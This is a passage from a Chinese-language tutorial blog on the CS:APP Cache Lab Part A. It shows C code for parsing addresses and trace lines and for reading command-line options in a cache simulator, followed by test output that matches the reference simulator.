</span><span id=__span-125-29><a id=__codelineno-125-29 name=__codelineno-125-29></a><span class=w>        </span><span class=p>}</span>
</span><span id=__span-125-30><a id=__codelineno-125-30 name=__codelineno-125-30></a><span class=w>        </span><span class=n>update</span><span class=p>(</span><span class=n>index</span><span class=p>,</span><span class=w> </span><span class=n>op_s</span><span class=p>,</span><span class=w> </span><span class=n>op_tag</span><span class=p>);</span><span class=w>    </span>
</span><span id=__span-125-31><a id=__codelineno-125-31 name=__codelineno-125-31></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-125-32><a id=__codelineno-125-32 name=__codelineno-125-32></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <p>至此，Part A 的核心部分函数就编写完了，下面的内容属于指令解析和读取命令行参数部分，与架构无关。</p> <h4 id=_10>指令解析<a class=headerlink href=#_10 title="Permanent link">¶</a></h4> <p>设计的数据结构解决了对 Cache 的操作问题，LRU 时间戳的实现解决了核心的驱逐问题，缓存扫描解决了对组中哪一行进行操作的问题，而<code>op_s</code>和<code>op_tag</code>怎么获取呢？接下来要解决的就是指令的解析问题了。</p> <p>输入数据为<code>[space]operation address, size</code>的形式，<code>operation</code>很容易获取，重要的是从<code>address</code>中分别获取我们需要的<code>op_s</code>和<code>op_tag</code>，<code>address</code>结构如下：</p> <p><img alt="alt text" src=../../img/image-97.png></p> <p>这就用到了第二章以及Data Lab的知识。<code>op_tag</code>很容易得到，右移 (s + b) 位即可：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-126-1>1</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-126-1><a id=__codelineno-126-1 name=__codelineno-126-1></a><span class=kt>int</span><span class=w> </span><span class=n>op_tag</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>address</span><span class=w> </span><span class=o>&gt;&gt;</span><span class=w> </span><span class=p>(</span><span class=n>s</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>b</span><span class=p>);</span>
</span></code></pre></div></td></tr></table></div> <p>获取 <code>op_s</code>，考虑先右移 b 位，再用无符号 0xFF...FF 右移后进行与操作将 tag 抹去:</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-127-1>1</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-127-1><a id=__codelineno-127-1 name=__codelineno-127-1></a><span class=kt>int</span><span class=w> </span><span class=n>op_s</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>address</span><span class=w> </span><span class=o>&gt;&gt;</span><span class=w> </span><span class=n>b</span><span class=p>)</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=p>((</span><span class=kt>unsigned</span><span class=p>)(</span><span class=mi>-1</span><span class=p>)</span><span class=w> </span><span class=o>&gt;&gt;</span><span class=w> </span><span class=p>(</span><span class=mi>8</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=kt>unsigned</span><span class=p>)</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>s</span><span class=p>));</span>
</span></code></pre></div></td></tr></table></div> <p>由于数据读写对于本模拟器而言是没有区别的，因此不同的指令对应的只是 Cache 更新次数的问题。如果指令是<code>M</code>则一次存储一次加载，总共更新两次，其他指令只用更新一次，而<code>I</code>无需考虑：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-128-1> 1</a></span>
<span class=normal><a href=#__codelineno-128-2> 2</a></span>
<span class=normal><a href=#__codelineno-128-3> 3</a></span>
<span class=normal><a href=#__codelineno-128-4> 4</a></span>
<span class=normal><a href=#__codelineno-128-5> 5</a></span>
<span class=normal><a href=#__codelineno-128-6> 6</a></span>
<span class=normal><a href=#__codelineno-128-7> 7</a></span>
<span class=normal><a href=#__codelineno-128-8> 8</a></span>
<span class=normal><a href=#__codelineno-128-9> 9</a></span>
<span class=normal><a href=#__codelineno-128-10>10</a></span>
<span class=normal><a href=#__codelineno-128-11>11</a></span>
<span class=normal><a href=#__codelineno-128-12>12</a></span>
<span class=normal><a href=#__codelineno-128-13>13</a></span>
<span class=normal><a href=#__codelineno-128-14>14</a></span>
<span class=normal><a href=#__codelineno-128-15>15</a></span>
<span class=normal><a href=#__codelineno-128-16>16</a></span>
<span class=normal><a href=#__codelineno-128-17>17</a></span>
<span class=normal><a href=#__codelineno-128-18>18</a></span>
<span class=normal><a href=#__codelineno-128-19>19</a></span>
<span class=normal><a href=#__codelineno-128-20>20</a></span>
<span class=normal><a href=#__codelineno-128-21>21</a></span>
<span class=normal><a href=#__codelineno-128-22>22</a></span>
<span class=normal><a href=#__codelineno-128-23>23</a></span>
<span class=normal><a href=#__codelineno-128-24>24</a></span>
<span class=normal><a href=#__codelineno-128-25>25</a></span>
<span class=normal><a href=#__codelineno-128-26>26</a></span>
<span class=normal><a href=#__codelineno-128-27>27</a></span>
<span class=normal><a href=#__codelineno-128-28>28</a></span>
<span class=normal><a href=#__codelineno-128-29>29</a></span>
<span class=normal><a href=#__codelineno-128-30>30</a></span>
<span class=normal><a href=#__codelineno-128-31>31</a></span>
<span class=normal><a href=#__codelineno-128-32>32</a></span>
<span class=normal><a href=#__codelineno-128-33>33</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-128-1><a id=__codelineno-128-1 name=__codelineno-128-1></a><span class=kt>void</span><span class=w> </span><span class=nf>get_trace</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>s</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>E</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>b</span><span class=p>)</span>
</span><span id=__span-128-2><a id=__codelineno-128-2 name=__codelineno-128-2></a><span class=p>{</span>
</span><span id=__span-128-3><a id=__codelineno-128-3 name=__codelineno-128-3></a><span class=w>    </span><span class=kt>FILE</span><span class=w> </span><span class=o>*</span><span class=n>pFile</span><span class=p>;</span>
</span><span id=__span-128-4><a id=__codelineno-128-4 name=__codelineno-128-4></a><span class=w>    </span><span class=n>pFile</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>fopen</span><span class=p>(</span><span class=n>t</span><span class=p>,</span><span class=w> </span><span class=s>"r"</span><span class=p>);</span>
</span><span id=__span-128-5><a id=__codelineno-128-5 name=__codelineno-128-5></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>pFile</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=nb>NULL</span><span class=p>)</span>
</span><span id=__span-128-6><a id=__codelineno-128-6 name=__codelineno-128-6></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-128-7><a id=__codelineno-128-7 name=__codelineno-128-7></a><span class=w>        </span><span class=n>exit</span><span class=p>(</span><span class=mi>-1</span><span class=p>);</span>
</span><span id=__span-128-8><a id=__codelineno-128-8 name=__codelineno-128-8></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-128-9><a id=__codelineno-128-9 name=__codelineno-128-9></a><span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=n>identifier</span><span class=p>;</span>
</span><span id=__span-128-10><a id=__codelineno-128-10 name=__codelineno-128-10></a><span class=w>    </span><span class=kt>unsigned</span><span class=w> </span><span class=n>address</span><span class=p>;</span>
</span><span id=__span-128-11><a id=__codelineno-128-11 name=__codelineno-128-11></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>size</span><span class=p>;</span>
</span><span id=__span-128-12><a id=__codelineno-128-12 name=__codelineno-128-12></a><span class=w>    </span><span class=c1>// Reading lines like " M 20,1" or "L 19,3"</span>
</span><span id=__span-128-13><a id=__codelineno-128-13 name=__codelineno-128-13></a><span class=w>    </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=n>fscanf</span><span class=p>(</span><span class=n>pFile</span><span class=p>,</span><span class=w> </span><span class=s>" %c %x,%d"</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>identifier</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>address</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>size</span><span class=p>)</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=mi>0</span><span class=p>)</span>
</span><span id=__span-128-14><a id=__codelineno-128-14 name=__codelineno-128-14></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-128-15><a id=__codelineno-128-15 name=__codelineno-128-15></a><span class=w>        </span><span class=c1>// 想办法先得到标记位和组序号</span>
</span><span id=__span-128-16><a id=__codelineno-128-16 name=__codelineno-128-16></a><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>op_tag</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>address</span><span class=w> </span><span class=o>&gt;&gt;</span><span class=w> </span><span class=p>(</span><span class=n>s</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>b</span><span class=p>);</span>
</span><span id=__span-128-17><a id=__codelineno-128-17 name=__codelineno-128-17></a><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>op_s</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>address</span><span class=w> </span><span class=o>&gt;&gt;</span><span class=w> </span><span class=n>b</span><span class=p>)</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=p>((</span><span class=kt>unsigned</span><span class=p>)(</span><span class=mi>-1</span><span class=p>)</span><span class=w> </span><span class=o>&gt;&gt;</span><span class=w> </span><span class=p>(</span><span class=mi>8</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=kt>unsigned</span><span class=p>)</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>s</span><span class=p>));</span>
</span><span id=__span-128-18><a id=__codelineno-128-18 name=__codelineno-128-18></a><span class=w>        </span><span class=k>switch</span><span class=w> </span><span class=p>(</span><span class=n>identifier</span><span class=p>)</span>
</span><span id=__span-128-19><a id=__codelineno-128-19 name=__codelineno-128-19></a><span class=w>        </span><span class=p>{</span>
</span><span id=__span-128-20><a id=__codelineno-128-20 name=__codelineno-128-20></a><span class=w>            </span><span class=k>case</span><span class=w> </span><span class=sc>'M'</span><span class=p>:</span><span class=w> </span><span class=c1>// 一次存储一次加载</span>
</span><span id=__span-128-21><a id=__codelineno-128-21 name=__codelineno-128-21></a><span class=w>                </span><span class=n>update_info</span><span class=p>(</span><span class=n>op_tag</span><span class=p>,</span><span class=w> </span><span class=n>op_s</span><span class=p>);</span>
</span><span id=__span-128-22><a id=__codelineno-128-22 name=__codelineno-128-22></a><span class=w>                </span><span class=n>update_info</span><span class=p>(</span><span class=n>op_tag</span><span class=p>,</span><span class=w> </span><span class=n>op_s</span><span class=p>);</span>
</span><span id=__span-128-23><a id=__codelineno-128-23 name=__codelineno-128-23></a><span class=w>                </span><span class=k>break</span><span class=p>;</span>
</span><span id=__span-128-24><a id=__codelineno-128-24 name=__codelineno-128-24></a><span class=w>            </span><span class=k>case</span><span class=w> </span><span class=sc>'L'</span><span class=p>:</span>
</span><span id=__span-128-25><a id=__codelineno-128-25 name=__codelineno-128-25></a><span class=w>                </span><span class=n>update_info</span><span class=p>(</span><span class=n>op_tag</span><span class=p>,</span><span class=w> </span><span class=n>op_s</span><span class=p>);</span>
</span><span id=__span-128-26><a id=__codelineno-128-26 name=__codelineno-128-26></a><span class=w>                </span><span class=k>break</span><span class=p>;</span>
</span><span id=__span-128-27><a id=__codelineno-128-27 name=__codelineno-128-27></a><span class=w>            </span><span class=k>case</span><span class=w> </span><span class=sc>'S'</span><span class=p>:</span>
</span><span id=__span-128-28><a id=__codelineno-128-28 name=__codelineno-128-28></a><span class=w>                </span><span class=n>update_info</span><span class=p>(</span><span class=n>op_tag</span><span class=p>,</span><span class=w> </span><span class=n>op_s</span><span class=p>);</span>
</span><span id=__span-128-29><a id=__codelineno-128-29 name=__codelineno-128-29></a><span class=w>                </span><span class=k>break</span><span class=p>;</span>
</span><span id=__span-128-30><a id=__codelineno-128-30 name=__codelineno-128-30></a><span class=w>        </span><span class=p>}</span>
</span><span id=__span-128-31><a id=__codelineno-128-31 name=__codelineno-128-31></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-128-32><a id=__codelineno-128-32 name=__codelineno-128-32></a><span class=w>    </span><span class=n>fclose</span><span class=p>(</span><span class=n>pFile</span><span class=p>);</span>
</span><span id=__span-128-33><a id=__codelineno-128-33 name=__codelineno-128-33></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <h4 id=_11>命令行参数获取<a class=headerlink href=#_11 title="Permanent link">¶</a></h4> <p>使用<code>getopt()</code>函数来获取命令行参数的字符串形式，然后用<code>atoi()</code>转换为要用的参数，最后用<code>switch</code>语句跳转到对应功能块：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-129-1> 1</a></span>
<span class=normal><a href=#__codelineno-129-2> 2</a></span>
<span class=normal><a href=#__codelineno-129-3> 3</a></span>
<span class=normal><a href=#__codelineno-129-4> 4</a></span>
<span class=normal><a href=#__codelineno-129-5> 5</a></span>
<span class=normal><a href=#__codelineno-129-6> 6</a></span>
<span class=normal><a href=#__codelineno-129-7> 7</a></span>
<span class=normal><a href=#__codelineno-129-8> 8</a></span>
<span class=normal><a href=#__codelineno-129-9> 9</a></span>
<span class=normal><a href=#__codelineno-129-10>10</a></span>
<span class=normal><a href=#__codelineno-129-11>11</a></span>
<span class=normal><a href=#__codelineno-129-12>12</a></span>
<span class=normal><a href=#__codelineno-129-13>13</a></span>
<span class=normal><a href=#__codelineno-129-14>14</a></span>
<span class=normal><a href=#__codelineno-129-15>15</a></span>
<span class=normal><a href=#__codelineno-129-16>16</a></span>
<span class=normal><a href=#__codelineno-129-17>17</a></span>
<span class=normal><a href=#__codelineno-129-18>18</a></span>
<span class=normal><a href=#__codelineno-129-19>19</a></span>
<span class=normal><a href=#__codelineno-129-20>20</a></span>
<span class=normal><a href=#__codelineno-129-21>21</a></span>
<span class=normal><a href=#__codelineno-129-22>22</a></span>
<span class=normal><a href=#__codelineno-129-23>23</a></span>
<span class=normal><a href=#__codelineno-129-24>24</a></span>
<span class=normal><a href=#__codelineno-129-25>25</a></span>
<span class=normal><a href=#__codelineno-129-26>26</a></span>
<span class=normal><a href=#__codelineno-129-27>27</a></span>
<span class=normal><a href=#__codelineno-129-28>28</a></span>
<span class=normal><a href=#__codelineno-129-29>29</a></span>
<span class=normal><a href=#__codelineno-129-30>30</a></span>
<span class=normal><a href=#__codelineno-129-31>31</a></span>
<span class=normal><a href=#__codelineno-129-32>32</a></span>
<span class=normal><a href=#__codelineno-129-33>33</a></span>
<span class=normal><a href=#__codelineno-129-34>34</a></span>
<span class=normal><a href=#__codelineno-129-35>35</a></span>
<span class=normal><a href=#__codelineno-129-36>36</a></span>
<span class=normal><a href=#__codelineno-129-37>37</a></span>
<span class=normal><a href=#__codelineno-129-38>38</a></span>
<span class=normal><a href=#__codelineno-129-39>39</a></span>
<span class=normal><a href=#__codelineno-129-40>40</a></span>
<span class=normal><a href=#__codelineno-129-41>41</a></span>
<span class=normal><a href=#__codelineno-129-42>42</a></span>
<span class=normal><a href=#__codelineno-129-43>43</a></span>
<span class=normal><a href=#__codelineno-129-44>44</a></span>
<span class=normal><a href=#__codelineno-129-45>45</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-129-1><a id=__codelineno-129-1 name=__codelineno-129-1></a><span class=kt>int</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>argc</span><span class=p>,</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>argv</span><span class=p>[])</span>
</span><span id=__span-129-2><a id=__codelineno-129-2 name=__codelineno-129-2></a><span class=p>{</span>
</span><span id=__span-129-3><a id=__codelineno-129-3 name=__codelineno-129-3></a><span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=n>opt</span><span class=p>;</span>
</span><span id=__span-129-4><a id=__codelineno-129-4 name=__codelineno-129-4></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>s</span><span class=p>,</span><span class=w> </span><span class=n>E</span><span class=p>,</span><span class=w> </span><span class=n>b</span><span class=p>;</span>
</span><span id=__span-129-5><a id=__codelineno-129-5 name=__codelineno-129-5></a><span class=w>    </span><span class=cm>/*</span>
</span><span id=__span-129-6><a id=__codelineno-129-6 name=__codelineno-129-6></a><span class=cm>    * s: S = 2^s 是组的个数</span>
</span><span id=__span-129-7><a id=__codelineno-129-7 name=__codelineno-129-7></a><span class=cm>    * E: 每组中有多少行</span>
</span><span id=__span-129-8><a id=__codelineno-129-8 name=__codelineno-129-8></a><span class=cm>    * b: B = 2^b 每个缓冲块的字节数</span>
</span><span id=__span-129-9><a id=__codelineno-129-9 name=__codelineno-129-9></a><span class=cm>    */</span>
</span><span id=__span-129-10><a id=__codelineno-129-10 name=__codelineno-129-10></a><span class=w>    </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=mi>-1</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=p>(</span><span class=n>opt</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getopt</span><span class=p>(</span><span class=n>argc</span><span class=p>,</span><span class=w> </span><span class=n>argv</span><span class=p>,</span><span class=w> </span><span class=s>"hvs:E:b:t:"</span><span class=p>)))</span>
</span><span id=__span-129-11><a id=__codelineno-129-11 name=__codelineno-129-11></a><span class=w>    </span><span class=c1>// 循环读取 argv 中的选项字符，直到没有更多选项（getopt 返回 -1）为止</span>
</span><span id=__span-129-12><a id=__codelineno-129-12 name=__codelineno-129-12></a><span class=w>    </span><span class=c1>// 不带冒号的字母（如 h、v、s）表示该选项不带参数（开关）</span>
</span><span id=__span-129-13><a id=__codelineno-129-13 name=__codelineno-129-13></a><span class=w>    </span><span class=c1>// 带单个冒号的字母（如 s:、E:、b:、t:）表示该选项需要一个参数，参数字符串通过全局变量 optarg 提供。</span>
</span><span id=__span-129-14><a id=__codelineno-129-14 name=__codelineno-129-14></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-129-15><a id=__codelineno-129-15 name=__codelineno-129-15></a><span class=w>        </span><span class=k>switch</span><span class=w> </span><span class=p>(</span><span class=n>opt</span><span class=p>)</span>
</span><span id=__span-129-16><a id=__codelineno-129-16 name=__codelineno-129-16></a><span class=w>        </span><span class=p>{</span>
</span><span id=__span-129-17><a id=__codelineno-129-17 name=__codelineno-129-17></a><span class=w>            </span><span class=k>case</span><span class=w> </span><span class=sc>'h'</span><span class=p>:</span>
</span><span id=__span-129-18><a id=__codelineno-129-18 name=__codelineno-129-18></a><span class=w>                </span><span class=n>print_help</span><span class=p>();</span>
</span><span id=__span-129-19><a id=__codelineno-129-19 name=__codelineno-129-19></a><span class=w>                </span><span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span><span id=__span-129-20><a id=__codelineno-129-20 name=__codelineno-129-20></a><span class=w>            </span><span class=k>case</span><span class=w> </span><span class=sc>'v'</span><span class=p>:</span>
</span><span id=__span-129-21><a id=__codelineno-129-21 name=__codelineno-129-21></a><span class=w>                </span><span class=n>verbose</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>1</span><span class=p>;</span>
</span><span id=__span-129-22><a id=__codelineno-129-22 name=__codelineno-129-22></a><span class=w>                </span><span class=k>break</span><span class=p>;</span>
</span><span id=__span-129-23><a id=__codelineno-129-23 name=__codelineno-129-23></a><span class=w>            </span><span class=k>case</span><span class=w> </span><span class=sc>'s'</span><span class=p>:</span>
</span><span id=__span-129-24><a id=__codelineno-129-24 name=__codelineno-129-24></a><span class=w>                </span><span class=n>s</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>atoi</span><span class=p>(</span><span class=n>optarg</span><span class=p>);</span>
</span><span id=__span-129-25><a id=__codelineno-129-25 name=__codelineno-129-25></a><span class=w>                </span><span class=k>break</span><span class=p>;</span>
</span><span id=__span-129-26><a id=__codelineno-129-26 name=__codelineno-129-26></a><span class=w>            </span><span class=k>case</span><span class=w> </span><span class=sc>'E'</span><span class=p>:</span>
</span><span id=__span-129-27><a id=__codelineno-129-27 name=__codelineno-129-27></a><span class=w>                </span><span class=n>E</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>atoi</span><span class=p>(</span><span class=n>optarg</span><span class=p>);</span>
</span><span id=__span-129-28><a id=__codelineno-129-28 name=__codelineno-129-28></a><span class=w>                </span><span class=k>break</span><span class=p>;</span>
</span><span id=__span-129-29><a id=__codelineno-129-29 name=__codelineno-129-29></a><span class=w>            </span><span class=k>case</span><span class=w> </span><span class=sc>'b'</span><span class=p>:</span>
</span><span id=__span-129-30><a id=__codelineno-129-30 name=__codelineno-129-30></a><span class=w>                </span><span class=n>b</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>atoi</span><span class=p>(</span><span class=n>optarg</span><span class=p>);</span>
</span><span id=__span-129-31><a id=__codelineno-129-31 name=__codelineno-129-31></a><span class=w>                </span><span class=k>break</span><span class=p>;</span>
</span><span id=__span-129-32><a id=__codelineno-129-32 name=__codelineno-129-32></a><span class=w>            </span><span class=k>case</span><span class=w> </span><span class=sc>'t'</span><span class=p>:</span>
</span><span id=__span-129-33><a id=__codelineno-129-33 name=__codelineno-129-33></a><span class=w>                </span><span class=n>strcpy</span><span class=p>(</span><span class=n>t</span><span class=p>,</span><span class=w> </span><span class=n>optarg</span><span class=p>);</span>
</span><span id=__span-129-34><a id=__codelineno-129-34 name=__codelineno-129-34></a><span class=w>                </span><span class=k>break</span><span class=p>;</span>
</span><span id=__span-129-35><a id=__codelineno-129-35 name=__codelineno-129-35></a><span class=w>            </span><span class=k>default</span><span class=o>:</span>
</span><span id=__span-129-36><a id=__codelineno-129-36 name=__codelineno-129-36></a><span class=w>                </span><span class=n>print_help</span><span class=p>();</span>
</span><span id=__span-129-37><a id=__codelineno-129-37 name=__codelineno-129-37></a><span class=w>                </span><span class=n>exit</span><span class=p>(</span><span class=mi>-1</span><span class=p>);</span>
</span><span id=__span-129-38><a id=__codelineno-129-38 name=__codelineno-129-38></a><span class=w>        </span><span class=p>}</span>
</span><span id=__span-129-39><a id=__codelineno-129-39 name=__codelineno-129-39></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-129-40><a id=__codelineno-129-40 name=__codelineno-129-40></a><span class=w>    </span><span class=n>Init_Cache</span><span class=p>(</span><span class=n>s</span><span class=p>,</span><span class=w> </span><span class=n>E</span><span class=p>,</span><span class=w> </span><span class=n>b</span><span class=p>);</span><span class=w> </span><span class=c1>//初始化一个cache</span>
</span><span id=__span-129-41><a id=__codelineno-129-41 name=__codelineno-129-41></a><span class=w>    </span><span class=n>get_trace</span><span class=p>(</span><span class=n>s</span><span class=p>,</span><span class=w> </span><span class=n>E</span><span class=p>,</span><span class=w> </span><span class=n>b</span><span class=p>);</span>
</span><span id=__span-129-42><a id=__codelineno-129-42 name=__codelineno-129-42></a><span class=w>    </span><span class=n>free_Cache</span><span class=p>();</span>
</span><span id=__span-129-43><a id=__codelineno-129-43 name=__codelineno-129-43></a><span class=w>    </span><span class=n>printSummary</span><span class=p>(</span><span class=n>hit_count</span><span class=p>,</span><span class=w> </span><span class=n>miss_count</span><span class=p>,</span><span class=w> </span><span class=n>eviction_count</span><span class=p>);</span>
</span><span id=__span-129-44><a id=__codelineno-129-44 name=__codelineno-129-44></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
</span><span id=__span-129-45><a id=__codelineno-129-45 name=__codelineno-129-45></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <p>结果：</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-130-1> 1</a></span>
<span class=normal><a href=#__codelineno-130-2> 2</a></span>
<span class=normal><a href=#__codelineno-130-3> 3</a></span>
<span class=normal><a href=#__codelineno-130-4> 4</a></span>
<span class=normal><a href=#__codelineno-130-5> 5</a></span>
<span class=normal><a href=#__codelineno-130-6> 6</a></span>
<span class=normal><a href=#__codelineno-130-7> 7</a></span>
<span class=normal><a href=#__codelineno-130-8> 8</a></span>
<span class=normal><a href=#__codelineno-130-9> 9</a></span>
<span class=normal><a href=#__codelineno-130-10>10</a></span>
<span class=normal><a href=#__codelineno-130-11>11</a></span>
<span class=normal><a href=#__codelineno-130-12>12</a></span>
<span class=normal><a href=#__codelineno-130-13>13</a></span>
<span class=normal><a href=#__codelineno-130-14>14</a></span>
<span class=normal><a href=#__codelineno-130-15>15</a></span>
<span class=normal><a href=#__codelineno-130-16>16</a></span>
<span class=normal><a href=#__codelineno-130-17>17</a></span>
<span class=normal><a href=#__codelineno-130-18>18</a></span>
<span class=normal><a href=#__codelineno-130-19>19</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-130-1><a id=__codelineno-130-1 name=__codelineno-130-1></a><span class=m>05</span>-Cache-Lab$<span class=w> </span>make<span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span>./test-csim
</span><span id=__span-130-2><a id=__codelineno-130-2 name=__codelineno-130-2></a>gcc<span class=w> </span>-g<span class=w> </span>-Wall<span class=w> </span>-Werror<span class=w> </span>-std<span class=o>=</span>c99<span class=w> </span>-m64<span class=w> </span>-o<span class=w> </span>csim<span class=w> </span>csim.c<span class=w> </span>cachelab.c<span class=w> </span>-lm<span class=w> </span>
</span><span id=__span-130-3><a id=__codelineno-130-3 name=__codelineno-130-3></a><span class=c1># Generate a handin tar file each time you compile</span>
</span><span id=__span-130-4><a id=__codelineno-130-4 name=__codelineno-130-4></a>tar<span class=w> </span>-cvf<span class=w> </span>lingyu-handin.tar<span class=w>  </span>csim.c<span class=w> </span>trans.c<span class=w> </span>
</span><span id=__span-130-5><a id=__codelineno-130-5 name=__codelineno-130-5></a>csim.c
</span><span id=__span-130-6><a id=__codelineno-130-6 name=__codelineno-130-6></a>trans.c
</span><span id=__span-130-7><a id=__codelineno-130-7 name=__codelineno-130-7></a><span class=w>                        </span>Your<span class=w> </span>simulator<span class=w>     </span>Reference<span class=w> </span>simulator
</span><span id=__span-130-8><a id=__codelineno-130-8 name=__codelineno-130-8></a>Points<span class=w> </span><span class=o>(</span>s,E,b<span class=o>)</span><span class=w>    </span>Hits<span class=w>  </span>Misses<span class=w>  </span>Evicts<span class=w>    </span>Hits<span class=w>  </span>Misses<span class=w>  </span>Evicts
</span><span id=__span-130-9><a id=__codelineno-130-9 name=__codelineno-130-9></a><span class=w>     </span><span class=m>3</span><span class=w> </span><span class=o>(</span><span class=m>1</span>,1,1<span class=o>)</span><span class=w>      </span><span class=m>9</span><span class=w>       </span><span class=m>8</span><span class=w>       </span><span class=m>6</span><span class=w>       </span><span class=m>9</span><span class=w>       </span><span class=m>8</span><span class=w>       </span><span class=m>6</span><span class=w>  </span>traces/yi2.trace
</span><span id=__span-130-10><a id=__codelineno-130-10 name=__codelineno-130-10></a><span class=w>     </span><span class=m>3</span><span class=w> </span><span class=o>(</span><span class=m>4</span>,2,4<span class=o>)</span><span class=w>      </span><span class=m>4</span><span class=w>       </span><span class=m>5</span><span class=w>       </span><span class=m>2</span><span class=w>       </span><span class=m>4</span><span class=w>       </span><span class=m>5</span><span class=w>       </span><span class=m>2</span><span class=w>  </span>traces/yi.trace
</span><span id=__span-130-11><a id=__codelineno-130-11 name=__codelineno-130-11></a><span class=w>     </span><span class=m>3</span><span class=w> </span><span class=o>(</span><span class=m>2</span>,1,4<span class=o>)</span><span class=w>      </span><span class=m>2</span><span class=w>       </span><span class=m>3</span><span class=w>       </span><span class=m>1</span><span class=w>       </span><span class=m>2</span><span class=w>       </span><span class=m>3</span><span class=w>       </span><span class=m>1</span><span class=w>  </span>traces/dave.trace
</span><span id=__span-130-12><a id=__codelineno-130-12 name=__codelineno-130-12></a><span class=w>     </span><span class=m>3</span><span class=w> </span><span class=o>(</span><span class=m>2</span>,1,3<span class=o>)</span><span class=w>    </span><span class=m>167</span><span class=w>      </span><span class=m>71</span><span class=w>      </span><span class=m>67</span><span class=w>     </span><span class=m>167</span><span class=w>      </span><span class=m>71</span><span class=w>      </span><span class=m>67</span><span class=w>  </span>traces/trans.trace
</span><span id=__span-130-13><a id=__codelineno-130-13 name=__codelineno-130-13></a><span class=w>     </span><span class=m>3</span><span class=w> </span><span class=o>(</span><span class=m>2</span>,2,3<span class=o>)</span><span class=w>    </span><span class=m>201</span><span class=w>      </span><span class=m>37</span><span class=w>      </span><span class=m>29</span><span class=w>     </span><span class=m>201</span><span class=w>      </span><span class=m>37</span><span class=w>      </span><span class=m>29</span><span class=w>  </span>traces/trans.trace
</span><span id=__span-130-14><a id=__codelineno-130-14 name=__codelineno-130-14></a><span class=w>     </span><span class=m>3</span><span class=w> </span><span class=o>(</span><span class=m>2</span>,4,3<span class=o>)</span><span class=w>    </span><span class=m>212</span><span class=w>      </span><span class=m>26</span><span class=w>      </span><span class=m>10</span><span class=w>     </span><span class=m>212</span><span class=w>      </span><span class=m>26</span><span class=w>      </span><span class=m>10</span><span class=w>  </span>traces/trans.trace
